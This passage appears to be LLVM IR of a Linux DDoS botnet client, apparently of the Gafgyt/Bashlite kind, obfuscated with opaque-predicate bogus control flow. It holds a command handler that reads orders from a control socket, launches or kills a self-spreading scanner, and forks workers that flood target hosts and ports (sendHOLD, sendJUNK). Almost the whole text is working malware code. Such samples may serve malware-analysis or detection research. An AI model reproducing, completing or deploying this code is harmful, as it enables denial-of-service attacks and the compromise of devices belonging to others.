  %394 = urem i32 %393, 2
  %395 = icmp eq i32 %394, 0
  %396 = icmp slt i32 %391, 10
  %397 = or i1 %395, %396
  br i1 %397, label %originalBBpart254, label %originalBB52alteredBB

originalBBpart254:                                ; preds = %originalBB52
  br label %82

; <label>:398:                                    ; preds = %82
  %399 = load i32, i32* @x.77
  %400 = load i32, i32* @y.78
  %401 = sub i32 %399, 1
  %402 = mul i32 %399, %401
  %403 = urem i32 %402, 2
  %404 = icmp eq i32 %403, 0
  %405 = icmp slt i32 %400, 10
  %406 = or i1 %404, %405
  br i1 %406, label %originalBB56, label %originalBB56alteredBB

originalBB56:                                     ; preds = %originalBB56alteredBB, %398
  %407 = load i8*, i8** %18, align 8
  call void @llvm.stackrestore(i8* %407)
  %408 = load i32, i32* @x.77
  %409 = load i32, i32* @y.78
  %410 = sub i32 %408, 1
  %411 = mul i32 %408, %410
  %412 = urem i32 %411, 2
  %413 = icmp eq i32 %412, 0
  %414 = icmp slt i32 %409, 10
  %415 = or i1 %413, %414
  br i1 %415, label %originalBBpart258, label %originalBB56alteredBB

originalBBpart258:                                ; preds = %originalBB56
  br label %416

; <label>:416:                                    ; preds = %originalBBpart258, %49
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %3
  %417 = alloca i8*, align 8
  %418 = alloca i32, align 4
  %419 = alloca i32, align 4
  %420 = alloca i32, align 4
  %421 = alloca i32, align 4
  %422 = alloca %struct.sockaddr_in, align 4
  %423 = alloca i8*, align 8
  %424 = alloca %struct.__sigset_t, align 8
  %425 = alloca %struct.timeval, align 8
  %426 = alloca i32, align 4
  %427 = alloca i32, align 4
  %428 = alloca i32, align 4
  %429 = alloca i8*, align 8
  %430 = alloca i32, align 4
  %431 = alloca i32, align 4
  %432 = alloca i32, align 4
  %433 = alloca i32, align 4
  %434 = alloca i32, align 4
  store i8* %0, i8** %417, align 8
  store i32 %1, i32* %418, align 4
  store i32 %2, i32* %419, align 4
  %435 = call i32 @getdtablesize() #4
  %_ = sub i32 0, %435
  %gen = add i32 %_, 2
  %_1 = sub i32 0, %435
  %gen2 = add i32 %_1, 2
  %_3 = sub i32 0, %435
  %gen4 = add i32 %_3, 2
  %_5 = sub i32 0, %435
  %gen6 = add i32 %_5, 2
  %_7 = shl i32 %435, 2
  %_8 = shl i32 %435, 2
  %436 = sdiv i32 %435, 2
  store i32 %436, i32* %420, align 4
  %437 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %422, i32 0, i32 0
  store i16 2, i16* %437, align 4
  %438 = load i32, i32* %418, align 4
  %439 = trunc i32 %438 to i16
  %440 = call zeroext i16 @htons(i16 zeroext %439) #13
  %441 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %422, i32 0, i32 1
  store i16 %440, i16* %441, align 2
  %442 = load i8*, i8** %417, align 8
  %443 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %422, i32 0, i32 2
  %444 = call i32 @getHost(i8* %442, %struct.in_addr* %443)
  %445 = icmp ne i32 %444, 0
  br label %originalBB

originalBB9alteredBB:                             ; preds = %originalBB9, %50
  %446 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 3
  %447 = getelementptr inbounds [8 x i8], [8 x i8]* %446, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %447, i8 0, i64 8, i32 4, i1 false)
  %448 = load i32, i32* %15, align 4
  %449 = zext i32 %448 to i64
  %450 = call i8* @llvm.stacksave()
  store i8* %450, i8** %18, align 8
  %451 = alloca %struct.state_t, i64 %449, align 16
  %452 = bitcast %struct.state_t* %451 to i8*
  %453 = load i32, i32* %15, align 4
  %454 = sext i32 %453 to i64
  %_10 = sub i64 %454, 5
  %gen11 = mul i64 %_10, 5
  %_12 = shl i64 %454, 5
  %_13 = sub i64 %454, 5
  %gen14 = mul i64 %_13, 5
  %_15 = sub i64 0, %454
  %gen16 = add i64 %_15, 5
  %_17 = sub i64 0, %454
  %gen18 = add i64 %_17, 5
  %455 = mul i64 %454, 5
  call void @llvm.memset.p0i8.i64(i8* %452, i8 0, i64 %455, i32 16, i1 false)
  %456 = call noalias i8* @malloc(i64 1024) #4
  store i8* %456, i8** %24, align 8
  %457 = load i8*, i8** %24, align 8
  call void @llvm.memset.p0i8.i64(i8* %457, i8 0, i64 1024, i32 1, i1 false)
  %458 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %459 = load i32, i32* %14, align 4
  %_19 = sub i32 0, %458
  %gen20 = add i32 %_19, %459
  %_21 = sub i32 0, %458
  %gen22 = add i32 %_21, %459
  %_23 = sub i32 0, %458
  %gen24 = add i32 %_23, %459
  %460 = add nsw i32 %458, %459
  store i32 %460, i32* %25, align 4
  br label %originalBB9

originalBB28alteredBB:                            ; preds = %originalBB28, %136
  %461 = load i32, i32* %16, align 4
  %462 = sext i32 %461 to i64
  %463 = getelementptr inbounds %struct.state_t, %struct.state_t* %64, i64 %462
  %464 = getelementptr inbounds %struct.state_t, %struct.state_t* %463, i32 0, i32 1
  store i8 1, i8* %464, align 4
  br label %originalBB28

originalBB32alteredBB:                            ; preds = %originalBB32, %158
  br label %originalBB32

originalBB36alteredBB:                            ; preds = %originalBB36, %216
  store i32 4, i32* %21, align 4
  %465 = load i32, i32* %16, align 4
  %466 = sext i32 %465 to i64
  %467 = getelementptr inbounds %struct.state_t, %struct.state_t* %64, i64 %466
  %468 = getelementptr inbounds %struct.state_t, %struct.state_t* %467, i32 0, i32 0
  %469 = load i32, i32* %468, align 8
  %470 = bitcast i32* %22 to i8*
  %471 = call i32 @getsockopt(i32 %469, i32 1, i32 4, i8* %470, i32* %21) #4
  %472 = load i32, i32* %22, align 4
  %473 = icmp ne i32 %472, 0
  br label %originalBB36

originalBB40alteredBB:                            ; preds = %originalBB40, %274
  br label %originalBB40

originalBB44alteredBB:                            ; preds = %originalBB44, %301
  br label %originalBB44

originalBB48alteredBB:                            ; preds = %originalBB48, %360
  br label %originalBB48

originalBB52alteredBB:                            ; preds = %originalBB52, %381
  br label %originalBB52

originalBB56alteredBB:                            ; preds = %originalBB56, %398
  %474 = load i8*, i8** %18, align 8
  call void @llvm.stackrestore(i8* %474)
  br label %originalBB56
}

; Function Attrs: noinline nounwind uwtable
define void @processCmd(i32, i8**) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8**, align 8
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i8*, align 8
  %10 = alloca i8*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i8*, align 8
  %14 = alloca i8*, align 8
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8*, align 8
  %21 = alloca i8*, align 8
  %22 = alloca i32, align 4
  %23 = alloca i8*, align 8
  %24 = alloca i8*, align 8
  %25 = alloca i32, align 4
  %26 = alloca i32, align 4
  %27 = alloca i32, align 4
  %28 = alloca i8*, align 8
  %29 = alloca i32, align 4
  %30 = alloca i32, align 4
  %31 = alloca i8*, align 8
  %32 = alloca i32, align 4
  %33 = alloca i64, align 8
  store i32 %0, i32* %3, align 4
  store i8** %1, i8*** %4, align 8
  %34 = load i8**, i8*** %4, align 8
  %35 = getelementptr inbounds i8*, i8** %34, i64 0
  %36 = load i8*, i8** %35, align 8
  %37 = call i32 @strcmp(i8* %36, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.21, i32 0, i32 0)) #10
  %38 = icmp ne i32 %37, 0
  br i1 %38, label %42, label %39

; <label>:39:                                     ; preds = %2
  %40 = load i32, i32* @mainCommSock, align 4
  %41 = call i32 (i32, i8*, ...) @sockprintf(i32 %40, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.50, i32 0, i32 0))
  br label %1248

; <label>:42:                                     ; preds = %2
  %43 = load i8**, i8*** %4, align 8
  %44 = getelementptr inbounds i8*, i8** %43, i64 0
  %45 = load i8*, i8** %44, align 8
  %46 = call i32 @strcmp(i8* %45, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.51, i32 0, i32 0)) #10
  %47 = icmp ne i32 %46, 0
  br i1 %47, label %53, label %48

; <label>:48:                                     ; preds = %42
  %49 = load i32, i32* @mainCommSock, align 4
  %50 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %51 = call i8* @inet_ntoa(i32 %50) #4
  %52 = call i32 (i32, i8*, ...) @sockprintf(i32 %49, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.52, i32 0, i32 0), i8* %51)
  br label %1248

; <label>:53:                                     ; preds = %42
  %54 = load i8**, i8*** %4, align 8
  %55 = getelementptr inbounds i8*, i8** %54, i64 0
  %56 = load i8*, i8** %55, align 8
  %57 = call i32 @strcmp(i8* %56, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.53, i32 0, i32 0)) #10
  %58 = icmp ne i32 %57, 0
  br i1 %58, label %197, label %59

; <label>:59:                                     ; preds = %53
  %60 = load i32, i32* @x.79
  %61 = load i32, i32* @y.80
  %62 = sub i32 %60, 1
  %63 = mul i32 %60, %62
  %64 = urem i32 %63, 2
  %65 = icmp eq i32 %64, 0
  %66 = icmp slt i32 %61, 10
  %67 = or i1 %65, %66
  br i1 %67, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %59
  %68 = load i32, i32* %3, align 4
  %69 = icmp ne i32 %68, 2
  %70 = load i32, i32* @x.79
  %71 = load i32, i32* @y.80
  %72 = sub i32 %70, 1
  %73 = mul i32 %70, %72
  %74 = urem i32 %73, 2
  %75 = icmp eq i32 %74, 0
  %76 = icmp slt i32 %71, 10
  %77 = or i1 %75, %76
  br i1 %77, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %69, label %78, label %97

; <label>:78:                                     ; preds = %originalBBpart2
  %79 = load i32, i32* @x.79
  %80 = load i32, i32* @y.80
  %81 = sub i32 %79, 1
  %82 = mul i32 %79, %81
  %83 = urem i32 %82, 2
  %84 = icmp eq i32 %83, 0
  %85 = icmp slt i32 %80, 10
  %86 = or i1 %84, %85
  br i1 %86, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %78
  %87 = load i32, i32* @mainCommSock, align 4
  %88 = call i32 (i32, i8*, ...) @sockprintf(i32 %87, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.54, i32 0, i32 0))
  %89 = load i32, i32* @x.79
  %90 = load i32, i32* @y.80
  %91 = sub i32 %89, 1
  %92 = mul i32 %89, %91
  %93 = urem i32 %92, 2
  %94 = icmp eq i32 %93, 0
  %95 = icmp slt i32 %90, 10
  %96 = or i1 %94, %95
  br i1 %96, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %1248

; <label>:97:                                     ; preds = %originalBBpart2
  %98 = load i8**, i8*** %4, align 8
  %99 = getelementptr inbounds i8*, i8** %98, i64 1
  %100 = load i8*, i8** %99, align 8
  %101 = call i32 @strcmp(i8* %100, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.55, i32 0, i32 0)) #10
  %102 = icmp ne i32 %101, 0
  br i1 %102, label %142, label %103

; <label>:103:                                    ; preds = %97
  %104 = load i32, i32* @x.79
  %105 = load i32, i32* @y.80
  %106 = sub i32 %104, 1
  %107 = mul i32 %104, %106
  %108 = urem i32 %107, 2
  %109 = icmp eq i32 %108, 0
  %110 = icmp slt i32 %105, 10
  %111 = or i1 %109, %110
  br i1 %111, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %103
  %112 = load i32, i32* @scanPid, align 4
  %113 = icmp eq i32 %112, 0
  %114 = load i32, i32* @x.79
  %115 = load i32, i32* @y.80
  %116 = sub i32 %114, 1
  %117 = mul i32 %114, %116
  %118 = urem i32 %117, 2
  %119 = icmp eq i32 %118, 0
  %120 = icmp slt i32 %115, 10
  %121 = or i1 %119, %120
  br i1 %121, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %113, label %122, label %139

; <label>:122:                                    ; preds = %originalBBpart28
  %123 = load i32, i32* @x.79
  %124 = load i32, i32* @y.80
  %125 = sub i32 %123, 1
  %126 = mul i32 %123, %125
  %127 = urem i32 %126, 2
  %128 = icmp eq i32 %127, 0
  %129 = icmp slt i32 %124, 10
  %130 = or i1 %128, %129
  br i1 %130, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %122
  %131 = load i32, i32* @x.79
  %132 = load i32, i32* @y.80
  %133 = sub i32 %131, 1
  %134 = mul i32 %131, %133
  %135 = urem i32 %134, 2
  %136 = icmp eq i32 %135, 0
  %137 = icmp slt i32 %132, 10
  %138 = or i1 %136, %137
  br i1 %138, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %1248

; <label>:139:                                    ; preds = %originalBBpart28
  %140 = load i32, i32* @scanPid, align 4
  %141 = call i32 @kill(i32 %140, i32 9) #4
  store i32 0, i32* @scanPid, align 4
  br label %142

; <label>:142:                                    ; preds = %139, %97
  %143 = load i8**, i8*** %4, align 8
  %144 = getelementptr inbounds i8*, i8** %143, i64 1
  %145 = load i8*, i8** %144, align 8
  %146 = call i32 @strcmp(i8* %145, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.56, i32 0, i32 0)) #10
  %147 = icmp ne i32 %146, 0
  br i1 %147, label %196, label %148

; <label>:148:                                    ; preds = %142
  %149 = load i32, i32* @scanPid, align 4
  %150 = icmp ne i32 %149, 0
  br i1 %150, label %151, label %152

; <label>:151:                                    ; preds = %148
  br label %1248

; <label>:152:                                    ; preds = %148
  %153 = call i32 @fork() #4
  store i32 %153, i32* %5, align 4
  %154 = load i32, i32* %5, align 4
  %155 = icmp ugt i32 %154, 0
  br i1 %155, label %156, label %174

; <label>:156:                                    ; preds = %152
  %157 = load i32, i32* @x.79
  %158 = load i32, i32* @y.80
  %159 = sub i32 %157, 1
  %160 = mul i32 %157, %159
  %161 = urem i32 %160, 2
  %162 = icmp eq i32 %161, 0
  %163 = icmp slt i32 %158, 10
  %164 = or i1 %162, %163
  br i1 %164, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %156
  %165 = load i32, i32* %5, align 4
  store i32 %165, i32* @scanPid, align 4
  %166 = load i32, i32* @x.79
  %167 = load i32, i32* @y.80
  %168 = sub i32 %166, 1
  %169 = mul i32 %166, %168
  %170 = urem i32 %169, 2
  %171 = icmp eq i32 %170, 0
  %172 = icmp slt i32 %167, 10
  %173 = or i1 %171, %172
  br i1 %173, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br label %1248

; <label>:174:                                    ; preds = %152
  %175 = load i32, i32* %5, align 4
  %176 = icmp eq i32 %175, -1
  br i1 %176, label %177, label %178

; <label>:177:                                    ; preds = %174
  br label %1248

; <label>:178:                                    ; preds = %174
  %179 = load i32, i32* @x.79
  %180 = load i32, i32* @y.80
  %181 = sub i32 %179, 1
  %182 = mul i32 %179, %181
  %183 = urem i32 %182, 2
  %184 = icmp eq i32 %183, 0
  %185 = icmp slt i32 %180, 10
  %186 = or i1 %184, %185
  br i1 %186, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %178
  %187 = load i32, i32* @x.79
  %188 = load i32, i32* @y.80
  %189 = sub i32 %187, 1
  %190 = mul i32 %187, %189
  %191 = urem i32 %190, 2
  %192 = icmp eq i32 %191, 0
  %193 = icmp slt i32 %188, 10
  %194 = or i1 %192, %193
  br i1 %194, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br label %195

; <label>:195:                                    ; preds = %originalBBpart220
  call void @StartTheLelz()
  call void @_exit(i32 0) #12
  unreachable

; <label>:196:                                    ; preds = %142
  br label %197

; <label>:197:                                    ; preds = %196, %53
  %198 = load i32, i32* @x.79
  %199 = load i32, i32* @y.80
  %200 = sub i32 %198, 1
  %201 = mul i32 %198, %200
  %202 = urem i32 %201, 2
  %203 = icmp eq i32 %202, 0
  %204 = icmp slt i32 %199, 10
  %205 = or i1 %203, %204
  br i1 %205, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %197
  %206 = load i8**, i8*** %4, align 8
  %207 = getelementptr inbounds i8*, i8** %206, i64 0
  %208 = load i8*, i8** %207, align 8
  %209 = call i32 @strcmp(i8* %208, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.57, i32 0, i32 0)) #10
  %210 = icmp ne i32 %209, 0
  %211 = load i32, i32* @x.79
  %212 = load i32, i32* @y.80
  %213 = sub i32 %211, 1
  %214 = mul i32 %211, %213
  %215 = urem i32 %214, 2
  %216 = icmp eq i32 %215, 0
  %217 = icmp slt i32 %212, 10
  %218 = or i1 %216, %217
  br i1 %218, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br i1 %210, label %353, label %219

; <label>:219:                                    ; preds = %originalBBpart224
  %220 = load i32, i32* %3, align 4
  %221 = icmp slt i32 %220, 4
  br i1 %221, label %250, label %222

; <label>:222:                                    ; preds = %219
  %223 = load i8**, i8*** %4, align 8
  %224 = getelementptr inbounds i8*, i8** %223, i64 2
  %225 = load i8*, i8** %224, align 8
  %226 = call i32 @atoi(i8* %225) #10
  %227 = icmp slt i32 %226, 1
  br i1 %227, label %250, label %228

; <label>:228:                                    ; preds = %222
  %229 = load i32, i32* @x.79
  %230 = load i32, i32* @y.80
  %231 = sub i32 %229, 1
  %232 = mul i32 %229, %231
  %233 = urem i32 %232, 2
  %234 = icmp eq i32 %233, 0
  %235 = icmp slt i32 %230, 10
  %236 = or i1 %234, %235
  br i1 %236, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %228
  %237 = load i8**, i8*** %4, align 8
  %238 = getelementptr inbounds i8*, i8** %237, i64 3
  %239 = load i8*, i8** %238, align 8
  %240 = call i32 @atoi(i8* %239) #10
  %241 = icmp slt i32 %240, 1
  %242 = load i32, i32* @x.79
  %243 = load i32, i32* @y.80
  %244 = sub i32 %242, 1
  %245 = mul i32 %242, %244
  %246 = urem i32 %245, 2
  %247 = icmp eq i32 %246, 0
  %248 = icmp slt i32 %243, 10
  %249 = or i1 %247, %248
  br i1 %249, label %originalBBpart228, label %originalBB26alteredBB

originalBBpart228:                                ; preds = %originalBB26
  br i1 %241, label %250, label %251

; <label>:250:                                    ; preds = %originalBBpart228, %222, %219
  br label %1248

; <label>:251:                                    ; preds = %originalBBpart228
  %252 = load i8**, i8*** %4, align 8
  %253 = getelementptr inbounds i8*, i8** %252, i64 1
  %254 = load i8*, i8** %253, align 8
  store i8* %254, i8** %6, align 8
  %255 = load i8**, i8*** %4, align 8
  %256 = getelementptr inbounds i8*, i8** %255, i64 2
  %257 = load i8*, i8** %256, align 8
  %258 = call i32 @atoi(i8* %257) #10
  store i32 %258, i32* %7, align 4
  %259 = load i8**, i8*** %4, align 8
  %260 = getelementptr inbounds i8*, i8** %259, i64 3
  %261 = load i8*, i8** %260, align 8
  %262 = call i32 @atoi(i8* %261) #10
  store i32 %262, i32* %8, align 4
  %263 = load i8*, i8** %6, align 8
  %264 = call i8* @strstr(i8* %263, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.43, i32 0, i32 0)) #10
  %265 = icmp ne i8* %264, null
  br i1 %265, label %266, label %337

; <label>:266:                                    ; preds = %251
  %267 = load i32, i32* @x.79
  %268 = load i32, i32* @y.80
  %269 = sub i32 %267, 1
  %270 = mul i32 %267, %269
  %271 = urem i32 %270, 2
  %272 = icmp eq i32 %271, 0
  %273 = icmp slt i32 %268, 10
  %274 = or i1 %272, %273
  br i1 %274, label %originalBB30, label %originalBB30alteredBB

originalBB30:                                     ; preds = %originalBB30alteredBB, %266
  %275 = load i32, i32* @mainCommSock, align 4
  %276 = load i8*, i8** %6, align 8
  %277 = load i32, i32* %7, align 4
  %278 = load i32, i32* %8, align 4
  %279 = call i32 (i32, i8*, ...) @sockprintf(i32 %275, i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.58, i32 0, i32 0), i8* %276, i32 %277, i32 %278)
  %280 = load i8*, i8** %6, align 8
  %281 = call i8* @strtok(i8* %280, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.43, i32 0, i32 0)) #4
  store i8* %281, i8** %9, align 8
  %282 = load i32, i32* @x.79
  %283 = load i32, i32* @y.80
  %284 = sub i32 %282, 1
  %285 = mul i32 %282, %284
  %286 = urem i32 %285, 2
  %287 = icmp eq i32 %286, 0
  %288 = icmp slt i32 %283, 10
  %289 = or i1 %287, %288
  br i1 %289, label %originalBBpart232, label %originalBB30alteredBB

originalBBpart232:                                ; preds = %originalBB30
  br label %290

; <label>:290:                                    ; preds = %334, %originalBBpart232
  %291 = load i32, i32* @x.79
  %292 = load i32, i32* @y.80
  %293 = sub i32 %291, 1
  %294 = mul i32 %291, %293
  %295 = urem i32 %294, 2
  %296 = icmp eq i32 %295, 0
  %297 = icmp slt i32 %292, 10
  %298 = or i1 %296, %297
  br i1 %298, label %originalBB34, label %originalBB34alteredBB

originalBB34:                                     ; preds = %originalBB34alteredBB, %290
  %299 = load i8*, i8** %9, align 8
  %300 = icmp ne i8* %299, null
  %301 = load i32, i32* @x.79
  %302 = load i32, i32* @y.80
  %303 = sub i32 %301, 1
  %304 = mul i32 %301, %303
  %305 = urem i32 %304, 2
  %306 = icmp eq i32 %305, 0
  %307 = icmp slt i32 %302, 10
  %308 = or i1 %306, %307
  br i1 %308, label %originalBBpart236, label %originalBB34alteredBB

originalBBpart236:                                ; preds = %originalBB34
  br i1 %300, label %309, label %336

; <label>:309:                                    ; preds = %originalBBpart236
  %310 = call i32 @listFork()
  %311 = icmp ne i32 %310, 0
  br i1 %311, label %334, label %312

; <label>:312:                                    ; preds = %309
  %313 = load i32, i32* @x.79
  %314 = load i32, i32* @y.80
  %315 = sub i32 %313, 1
  %316 = mul i32 %313, %315
  %317 = urem i32 %316, 2
  %318 = icmp eq i32 %317, 0
  %319 = icmp slt i32 %314, 10
  %320 = or i1 %318, %319
  br i1 %320, label %originalBB38, label %originalBB38alteredBB

originalBB38:                                     ; preds = %originalBB38alteredBB, %312
  %321 = load i8*, i8** %9, align 8
  %322 = load i32, i32* %7, align 4
  %323 = load i32, i32* %8, align 4
  call void @sendHOLD(i8* %321, i32 %322, i32 %323)
  %324 = load i32, i32* @mainCommSock, align 4
  %325 = call i32 @close(i32 %324)
  call void @_exit(i32 0) #12
  %326 = load i32, i32* @x.79
  %327 = load i32, i32* @y.80
  %328 = sub i32 %326, 1
  %329 = mul i32 %326, %328
  %330 = urem i32 %329, 2
  %331 = icmp eq i32 %330, 0
  %332 = icmp slt i32 %327, 10
  %333 = or i1 %331, %332
  br i1 %333, label %originalBBpart240, label %originalBB38alteredBB

originalBBpart240:                                ; preds = %originalBB38
  unreachable

; <label>:334:                                    ; preds = %309
  %335 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.43, i32 0, i32 0)) #4
  store i8* %335, i8** %9, align 8
  br label %290

; <label>:336:                                    ; preds = %originalBBpart236
  br label %352

; <label>:337:                                    ; preds = %251
  %338 = call i32 @listFork()
  %339 = icmp ne i32 %338, 0
  br i1 %339, label %340, label %341

; <label>:340:                                    ; preds = %337
  br label %1248

; <label>:341:                                    ; preds = %337
  %342 = load i32, i32* @mainCommSock, align 4
  %343 = load i8*, i8** %6, align 8
  %344 = load i32, i32* %7, align 4
  %345 = load i32, i32* %8, align 4
  %346 = call i32 (i32, i8*, ...) @sockprintf(i32 %342, i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.58, i32 0, i32 0), i8* %343, i32 %344, i32 %345)
  %347 = load i8*, i8** %6, align 8
  %348 = load i32, i32* %7, align 4
  %349 = load i32, i32* %8, align 4
  call void @sendHOLD(i8* %347, i32 %348, i32 %349)
  %350 = load i32, i32* @mainCommSock, align 4
  %351 = call i32 @close(i32 %350)
  call void @_exit(i32 0) #12
  unreachable

; <label>:352:                                    ; preds = %336
  br label %353

; <label>:353:                                    ; preds = %352, %originalBBpart224
  %354 = load i8**, i8*** %4, align 8
  %355 = getelementptr inbounds i8*, i8** %354, i64 0
  %356 = load i8*, i8** %355, align 8
  %357 = call i32 @strcmp(i8* %356, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.59, i32 0, i32 0)) #10
  %358 = icmp ne i32 %357, 0
  br i1 %358, label %525, label %359

; <label>:359:                                    ; preds = %353
  %360 = load i32, i32* %3, align 4
  %361 = icmp slt i32 %360, 4
  br i1 %361, label %374, label %362

; <label>:362:                                    ; preds = %359
  %363 = load i8**, i8*** %4, align 8
  %364 = getelementptr inbounds i8*, i8** %363, i64 2
  %365 = load i8*, i8** %364, align 8
  %366 = call i32 @atoi(i8* %365) #10
  %367 = icmp slt i32 %366, 1
  br i1 %367, label %374, label %368

; <label>:368:                                    ; preds = %362
  %369 = load i8**, i8*** %4, align 8
  %370 = getelementptr inbounds i8*, i8** %369, i64 3
  %371 = load i8*, i8** %370, align 8
  %372 = call i32 @atoi(i8* %371) #10
  %373 = icmp slt i32 %372, 1
  br i1 %373, label %374, label %375

; <label>:374:                                    ; preds = %368, %362, %359
  br label %1248

; <label>:375:                                    ; preds = %368
  %376 = load i32, i32* @x.79
  %377 = load i32, i32* @y.80
  %378 = sub i32 %376, 1
  %379 = mul i32 %376, %378
  %380 = urem i32 %379, 2
  %381 = icmp eq i32 %380, 0
  %382 = icmp slt i32 %377, 10
  %383 = or i1 %381, %382
  br i1 %383, label %originalBB42, label %originalBB42alteredBB

originalBB42:                                     ; preds = %originalBB42alteredBB, %375
  %384 = load i8**, i8*** %4, align 8
  %385 = getelementptr inbounds i8*, i8** %384, i64 1
  %386 = load i8*, i8** %385, align 8
  store i8* %386, i8** %10, align 8
  %387 = load i8**, i8*** %4, align 8
  %388 = getelementptr inbounds i8*, i8** %387, i64 2
  %389 = load i8*, i8** %388, align 8
  %390 = call i32 @atoi(i8* %389) #10
  store i32 %390, i32* %11, align 4
  %391 = load i8**, i8*** %4, align 8
  %392 = getelementptr inbounds i8*, i8** %391, i64 3
  %393 = load i8*, i8** %392, align 8
  %394 = call i32 @atoi(i8* %393) #10
  store i32 %394, i32* %12, align 4
  %395 = load i8*, i8** %10, align 8
  %396 = call i8* @strstr(i8* %395, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.43, i32 0, i32 0)) #10
  %397 = icmp ne i8* %396, null
  %398 = load i32, i32* @x.79
  %399 = load i32, i32* @y.80
  %400 = sub i32 %398, 1
  %401 = mul i32 %398, %400
  %402 = urem i32 %401, 2
  %403 = icmp eq i32 %402, 0
  %404 = icmp slt i32 %399, 10
  %405 = or i1 %403, %404
  br i1 %405, label %originalBBpart244, label %originalBB42alteredBB

originalBBpart244:                                ; preds = %originalBB42
  br i1 %397, label %406, label %477

; <label>:406:                                    ; preds = %originalBBpart244
  %407 = load i32, i32* @mainCommSock, align 4
  %408 = load i8*, i8** %10, align 8
  %409 = load i32, i32* %11, align 4
  %410 = load i32, i32* %12, align 4
  %411 = call i32 (i32, i8*, ...) @sockprintf(i32 %407, i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.60, i32 0, i32 0), i8* %408, i32 %409, i32 %410)
  %412 = load i8*, i8** %10, align 8
  %413 = call i8* @strtok(i8* %412, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.43, i32 0, i32 0)) #4
  store i8* %413, i8** %13, align 8
  br label %414

; <label>:414:                                    ; preds = %originalBBpart256, %406
  %415 = load i32, i32* @x.79
  %416 = load i32, i32* @y.80
  %417 = sub i32 %415, 1
  %418 = mul i32 %415, %417
  %419 = urem i32 %418, 2
  %420 = icmp eq i32 %419, 0
  %421 = icmp slt i32 %416, 10
  %422 = or i1 %420, %421
  br i1 %422, label %originalBB46, label %originalBB46alteredBB

originalBB46:                                     ; preds = %originalBB46alteredBB, %414
  %423 = load i8*, i8** %13, align 8
  %424 = icmp ne i8* %423, null
  %425 = load i32, i32* @x.79
  %426 = load i32, i32* @y.80
  %427 = sub i32 %425, 1
  %428 = mul i32 %425, %427
  %429 = urem i32 %428, 2
  %430 = icmp eq i32 %429, 0
  %431 = icmp slt i32 %426, 10
  %432 = or i1 %430, %431
  br i1 %432, label %originalBBpart248, label %originalBB46alteredBB

originalBBpart248:                                ; preds = %originalBB46
  br i1 %424, label %433, label %476

; <label>:433:                                    ; preds = %originalBBpart248
  %434 = call i32 @listFork()
  %435 = icmp ne i32 %434, 0
  br i1 %435, label %458, label %436

; <label>:436:                                    ; preds = %433
  %437 = load i32, i32* @x.79
  %438 = load i32, i32* @y.80
  %439 = sub i32 %437, 1
  %440 = mul i32 %437, %439
  %441 = urem i32 %440, 2
  %442 = icmp eq i32 %441, 0
  %443 = icmp slt i32 %438, 10
  %444 = or i1 %442, %443
  br i1 %444, label %originalBB50, label %originalBB50alteredBB

originalBB50:                                     ; preds = %originalBB50alteredBB, %436
  %445 = load i8*, i8** %13, align 8
  %446 = load i32, i32* %11, align 4
  %447 = load i32, i32* %12, align 4
  call void @sendJUNK(i8* %445, i32 %446, i32 %447)
  %448 = load i32, i32* @mainCommSock, align 4
  %449 = call i32 @close(i32 %448)
